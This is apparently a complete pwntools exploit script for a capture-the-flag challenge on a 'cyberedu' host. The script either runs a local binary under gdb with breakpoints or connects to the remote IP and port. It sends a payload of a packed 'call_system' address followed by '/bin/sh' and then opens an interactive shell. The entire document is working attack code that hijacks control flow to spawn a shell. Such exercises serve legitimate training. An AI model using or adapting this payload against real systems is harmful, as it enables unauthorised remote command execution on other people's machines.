from pwn import *
elf = ELF('/home/kali/Downloads/main')
p=elf.process()

cyberedu = '34.159.240.221:30094'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    gdb.attach(p, gdbscript='''
    b* 0x4012D4
    b* 0x4012FC
    c
    ''')

#local testing, run normally
#remote testing, run python3 exploit.py REMOTE

#call system
call_system = 0x4011b6

payload = p64(call_system)
payload+= b'/bin/sh'
p.recvuntil(b'g\n')
p.sendline(payload)


p.interactive()
